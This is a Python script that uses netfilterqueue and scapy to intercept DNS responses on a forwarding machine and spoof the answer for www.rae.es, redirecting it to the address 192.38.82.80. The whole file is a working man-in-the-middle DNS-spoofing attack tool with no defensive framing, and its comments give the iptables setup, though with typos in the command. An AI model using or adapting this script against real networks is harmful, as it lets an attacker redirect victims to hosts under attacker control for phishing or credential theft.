#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        target = b"www.rae.es"
        # target.encode('base64')
        if target in qname:
            print(scapy_packet.show())
            print("Spoofin ebolig")
            answer = scapy.DNSRR(rrname=qname, rdata="192.38.82.80")  # The other IP
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Removing checksum and len from iplayer and udplayer to let scapy recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

# First need to trap the incoming packets to a queue: iptables -I FORDWARD -j queue-num 0

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# Remember to delte iptables wih iptables --flush
